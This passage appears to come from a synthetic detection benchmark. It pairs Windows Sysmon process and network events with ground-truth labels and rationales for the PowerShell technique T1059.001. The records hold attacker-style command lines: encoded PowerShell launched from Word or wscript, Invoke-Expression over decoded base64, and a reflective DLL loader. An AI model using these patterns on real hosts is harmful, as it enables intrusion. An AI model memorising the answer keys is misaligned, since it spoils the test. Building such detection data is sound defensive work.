    "event_id": "evt_f2301436",
    "event_record_id": 163183717332477,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAbABkAGUAcgBfAGEAcwBwAGUAbgBfADAAMAA5ADIAOQBkACcA",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
      "LogonId": "0xd045",
      "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "ParentProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
      "ParentProcessId": 53320,
      "ProcessGuid": "{946a2b81-35fd-1399-e072-b1b9ef9b7525}",
      "ProcessId": 53316,
      "User": "jsmith",
      "UtcTime": "2026-06-01T19:26:02Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T19:26:02Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=bc87f5aece4b3b2a5c86e61f8fb7a8d07b31d5e03f34f2cf1ecbf0afd4b3f282",
    "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
    "LogonId": "0xd045",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{065a807e-a1e9-5145-2496-eb7fb8f3a90d}",
    "ParentProcessId": 53312,
    "ProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
    "ProcessId": 53320,
    "User": "jsmith",
    "UtcTime": "2026-06-01T19:25:59Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAbwBsAGwAeQBfAGEAbABkAGUAcgBfAGEAcwBwAGUAbgBfADAAMAA5ADIAOQBkACcA",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{c0bb1156-100e-3d16-541e-cb613d506d9a}",
    "LogonId": "0xd045",
    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" \"C:\\Users\\Public\\holly_alder_aspen_00929d\\agenda.docx\"",
    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
    "ParentProcessGuid": "{e181967d-6ccc-5784-a115-5728ff2c0159}",
    "ParentProcessId": 53320,
    "ProcessGuid": "{946a2b81-35fd-1399-e072-b1b9ef9b7525}",
    "ProcessId": 53316,
    "User": "jsmith",
    "UtcTime": "2026-06-01T19:26:02Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_A/contextual",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_f2301436",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ParentImage"
        ]
      },
      {
        "event_id": "evt_53c599a7",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The contextual process-tree event confirms the Office-to-PowerShell lineage without adding another technique label.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_ebd72d33"
}
```

## pair_02a6611f
Family: TF_T1059_001_C; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_648d4259",
    "event_record_id": 81620656615985,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\Users\\Public\\alder_ash_willow_02a661\\run.ps1\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{ea2dcc43-b732-707c-988e-cedf2cf6318e}",
      "LogonId": "0x50b5",
      "ParentCommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
      "ParentProcessId": 20664,
      "ProcessGuid": "{4a3bca3e-7231-672e-ece0-cc817cbf4197}",
      "ProcessId": 20660,
      "User": "admin.svc",
      "UtcTime": "2026-06-01T18:30:24Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:30:24Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\Users\\Public\\alder_ash_willow_02a661\\run.ps1\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{ea2dcc43-b732-707c-988e-cedf2cf6318e}",
    "LogonId": "0x50b5",
    "ParentCommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
    "ParentProcessId": 20664,
    "ProcessGuid": "{4a3bca3e-7231-672e-ece0-cc817cbf4197}",
    "ProcessId": 20660,
    "User": "admin.svc",
    "UtcTime": "2026-06-01T18:30:24Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_C/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_648d4259",
        "fields": [
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "A WMI-parented PowerShell process is observable, but the invocation is dual-use and the single view lacks intent evidence.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_cb4efff5"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_d19cb62a",
    "event_record_id": 258126226730710,
    "fields": {
      "Computer": "WEB01",
      "DestinationIp": "203.0.113.50",
      "DestinationPort": 135,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
      "ProcessId": 20664,
      "Protocol": "tcp",
      "SourceIp": "203.0.113.30",
      "SourcePort": 60281,
      "User": "admin.svc",
      "UtcTime": "2026-06-01T18:30:21Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:30:21Z",
    "windows_event_id": 3
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_648d4259",
    "event_record_id": 81620656615985,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\Users\\Public\\alder_ash_willow_02a661\\run.ps1\"",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{ea2dcc43-b732-707c-988e-cedf2cf6318e}",
      "LogonId": "0x50b5",
      "ParentCommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
      "ParentProcessId": 20664,
      "ProcessGuid": "{4a3bca3e-7231-672e-ece0-cc817cbf4197}",
      "ProcessId": 20660,
      "User": "admin.svc",
      "UtcTime": "2026-06-01T18:30:24Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:30:24Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WEB01",
    "DestinationIp": "203.0.113.50",
    "DestinationPort": 135,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
    "ProcessId": 20664,
    "Protocol": "tcp",
    "SourceIp": "203.0.113.30",
    "SourcePort": 60281,
    "User": "admin.svc",
    "UtcTime": "2026-06-01T18:30:21Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\Users\\Public\\alder_ash_willow_02a661\\run.ps1\"",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{ea2dcc43-b732-707c-988e-cedf2cf6318e}",
    "LogonId": "0x50b5",
    "ParentCommandLine": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
    "ParentProcessGuid": "{eac3b20d-2ed6-e962-0445-6b2f35148f5f}",
    "ParentProcessId": 20664,
    "ProcessGuid": "{4a3bca3e-7231-672e-ece0-cc817cbf4197}",
    "ProcessId": 20660,
    "User": "admin.svc",
    "UtcTime": "2026-06-01T18:30:24Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_C/contextual",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_648d4259",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ParentImage",
          "ParentProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_d19cb62a",
        "fields": [
          "Computer",
          "DestinationPort",
          "ProcessGuid",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The WMI parent, non-interactive PowerShell invocation, and related RPC connection provide contextual evidence for this process lineage.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_7916c673"
}
```

## pair_25de00ef
Family: TF_T1059_001_DEV; split: dev
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_d5b2aa2c",
    "event_record_id": 714383512366,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGIAaQByAGMAaABfAGwAYQByAGMAaABfAG0AYQBwAGwAZQBfADIANQBkAGUAMAAwACcA",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{a3ae7447-4942-eb0b-af60-b7cd3e12e866}",
      "LogonId": "0xab9d",
      "ParentCommandLine": "C:\\Windows\\System32\\wscript.exe",
      "ParentImage": "C:\\Windows\\System32\\wscript.exe",
      "ParentProcessGuid": "{2ca450cd-777f-5aa9-f737-af3e44e3c79a}",
      "ParentProcessId": 43928,
      "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
      "ProcessId": 43932,
      "User": "admin.svc",
      "UtcTime": "2026-05-25T16:49:41Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-25T16:49:41Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGIAaQByAGMAaABfAGwAYQByAGMAaABfAG0AYQBwAGwAZQBfADIANQBkAGUAMAAwACcA",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{a3ae7447-4942-eb0b-af60-b7cd3e12e866}",
    "LogonId": "0xab9d",
    "ParentCommandLine": "C:\\Windows\\System32\\wscript.exe",
    "ParentImage": "C:\\Windows\\System32\\wscript.exe",
    "ParentProcessGuid": "{2ca450cd-777f-5aa9-f737-af3e44e3c79a}",
    "ParentProcessId": 43928,
    "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
    "ProcessId": 43932,
    "User": "admin.svc",
    "UtcTime": "2026-05-25T16:49:41Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_DEV/single",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_d5b2aa2c",
        "fields": [
          "CommandLine",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The DEV-only powershell core launched by wscript with encoded arguments has concrete technique-specific evidence in its anchor event.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_a66e9531"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_d5b2aa2c",
    "event_record_id": 714383512366,
    "fields": {
      "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGIAaQByAGMAaABfAGwAYQByAGMAaABfAG0AYQBwAGwAZQBfADIANQBkAGUAMAAwACcA",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "LogonGuid": "{a3ae7447-4942-eb0b-af60-b7cd3e12e866}",
      "LogonId": "0xab9d",
      "ParentCommandLine": "C:\\Windows\\System32\\wscript.exe",
      "ParentImage": "C:\\Windows\\System32\\wscript.exe",
      "ParentProcessGuid": "{2ca450cd-777f-5aa9-f737-af3e44e3c79a}",
      "ParentProcessId": 43928,
      "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
      "ProcessId": 43932,
      "User": "admin.svc",
      "UtcTime": "2026-05-25T16:49:41Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-25T16:49:41Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_77397840",
    "event_record_id": 230281597086240,
    "fields": {
      "Computer": "WORKSTATION01",
      "DestinationIp": "198.51.100.10",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
      "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
      "ProcessId": 43932,
      "Protocol": "tcp",
      "SourceIp": "192.0.2.30",
      "SourcePort": 54027,
      "User": "admin.svc",
      "UtcTime": "2026-05-25T16:49:44Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-25T16:49:44Z",
    "windows_event_id": 3
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGIAaQByAGMAaABfAGwAYQByAGMAaABfAG0AYQBwAGwAZQBfADIANQBkAGUAMAAwACcA",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=656870b7a837ffb1e8c22c3dc5bfb387c113804399f06d16fa6a7a1dba65bb4d",
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "LogonGuid": "{a3ae7447-4942-eb0b-af60-b7cd3e12e866}",
    "LogonId": "0xab9d",
    "ParentCommandLine": "C:\\Windows\\System32\\wscript.exe",
    "ParentImage": "C:\\Windows\\System32\\wscript.exe",
    "ParentProcessGuid": "{2ca450cd-777f-5aa9-f737-af3e44e3c79a}",
    "ParentProcessId": 43928,
    "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
    "ProcessId": 43932,
    "User": "admin.svc",
    "UtcTime": "2026-05-25T16:49:41Z"
  },
  {
    "Computer": "WORKSTATION01",
    "DestinationIp": "198.51.100.10",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
    "ProcessGuid": "{00a65493-532e-1e48-908d-75e62d33b2d4}",
    "ProcessId": 43932,
    "Protocol": "tcp",
    "SourceIp": "192.0.2.30",
    "SourcePort": 54027,
    "User": "admin.svc",
    "UtcTime": "2026-05-25T16:49:44Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_DEV/contextual",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_d5b2aa2c",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ParentImage"
        ]
      },
      {
        "event_id": "evt_77397840",
        "fields": [
          "Computer"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Context confirms the DEV-only powershell core launched by wscript with encoded arguments behavior through a related telemetry event.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_b3e81f15"
}
```

## pair_0082cc33
Family: TF_T1059_001_E; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_7631bf70",
    "event_record_id": 32333644589100,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQByAGMAaABfAGMAZQBkAGEAcgBfAHkAZQB3AF8AMAAwADgAMgBjAGMAJwA=')))\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{e884e073-1396-2c3e-d8d4-f4e2ea150811}",
      "LogonId": "0x69c1",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{26f84f06-2ceb-d84d-b6d0-e54c383d55aa}",
      "ParentProcessId": 27068,
      "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
      "ProcessId": 27072,
      "User": "mchen",
      "UtcTime": "2026-05-08T05:00:47Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-08T05:00:47Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQByAGMAaABfAGMAZQBkAGEAcgBfAHkAZQB3AF8AMAAwADgAMgBjAGMAJwA=')))\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{e884e073-1396-2c3e-d8d4-f4e2ea150811}",
    "LogonId": "0x69c1",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{26f84f06-2ceb-d84d-b6d0-e54c383d55aa}",
    "ParentProcessId": 27068,
    "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
    "ProcessId": 27072,
    "User": "mchen",
    "UtcTime": "2026-05-08T05:00:47Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_E/single",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_7631bf70",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process-creation record contains a PowerShell command line with dynamic-evaluation and decoding expressions; it does not establish command success.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_834bae95"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_7631bf70",
    "event_record_id": 32333644589100,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQByAGMAaABfAGMAZQBkAGEAcgBfAHkAZQB3AF8AMAAwADgAMgBjAGMAJwA=')))\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{e884e073-1396-2c3e-d8d4-f4e2ea150811}",
      "LogonId": "0x69c1",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{26f84f06-2ceb-d84d-b6d0-e54c383d55aa}",
      "ParentProcessId": 27068,
      "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
      "ProcessId": 27072,
      "User": "mchen",
      "UtcTime": "2026-05-08T05:00:47Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-08T05:00:47Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_6df19c40",
    "event_record_id": 276813512802907,
    "fields": {
      "Computer": "FILESVR01",
      "DestinationIp": "203.0.113.10",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
      "ProcessId": 27072,
      "Protocol": "tcp",
      "SourceIp": "192.0.2.40",
      "SourcePort": 64080,
      "User": "mchen",
      "UtcTime": "2026-05-08T05:00:50Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-08T05:00:50Z",
    "windows_event_id": 3
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGwAYQByAGMAaABfAGMAZQBkAGEAcgBfAHkAZQB3AF8AMAAwADgAMgBjAGMAJwA=')))\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{e884e073-1396-2c3e-d8d4-f4e2ea150811}",
    "LogonId": "0x69c1",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{26f84f06-2ceb-d84d-b6d0-e54c383d55aa}",
    "ParentProcessId": 27068,
    "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
    "ProcessId": 27072,
    "User": "mchen",
    "UtcTime": "2026-05-08T05:00:47Z"
  },
  {
    "Computer": "FILESVR01",
    "DestinationIp": "203.0.113.10",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "ProcessGuid": "{1d684366-682c-6b80-9293-5edf91b43458}",
    "ProcessId": 27072,
    "Protocol": "tcp",
    "SourceIp": "192.0.2.40",
    "SourcePort": 64080,
    "User": "mchen",
    "UtcTime": "2026-05-08T05:00:50Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_001_E/contextual",
  "evidence_refs": {
    "T1059.001": [
      {
        "event_id": "evt_7631bf70",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ProcessGuid"
        ]
      },
      {
        "event_id": "evt_6df19c40",
        "fields": [
          "Computer",
          "ProcessGuid"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The contextual event has the same process identity and repeats the obfuscated PowerShell invocation without introducing a new label.",
  "technique_ids": [
    "T1059.001"
  ],
  "technique_names": [
    "PowerShell"
  ],
  "view_id": "view_6f5cec0c"
}
```

## pair_06c78b4d
Family: TF_T1059_001_F; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "FILESVR01",
    "event_id": "evt_017d3b75",
    "event_record_id": 152033472428265,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Add-Type -TypeDefinition 'public class Loader {public static void Run() {System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes(@\"C:\\Users\\Public\\elm_pine_oak_06c78b\\cache.dll\"));}}'; [Loader]::Run()\"",
      "Computer": "FILESVR01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{8917a898-8afa-7b9e-ccef-72f69ff3a8c2}",
      "LogonId": "0x1d65",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{f25ca6cc-088f-08f1-2c2b-d43026ff83b2}",
      "ParentProcessId": 7520,
      "ProcessGuid": "{8a460d1e-38e9-9614-df73-23409b332f58}",
      "ProcessId": 7524,
      "User": "mchen",
      "UtcTime": "2026-06-01T18:16:29Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-01T18:16:29Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command \"Add-Type -TypeDefinition 'public class Loader {public static void Run() {System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes(@\"C:\\Users\\Public\\elm_pine_oak_06c78b\\cache.dll\"));}}'; [Loader]::Run()\"",
    "Computer": "FILESVR01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{8917a898-8afa-7b9e-ccef-72f69ff3a8c2}",
    "LogonId": "0x1d65",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
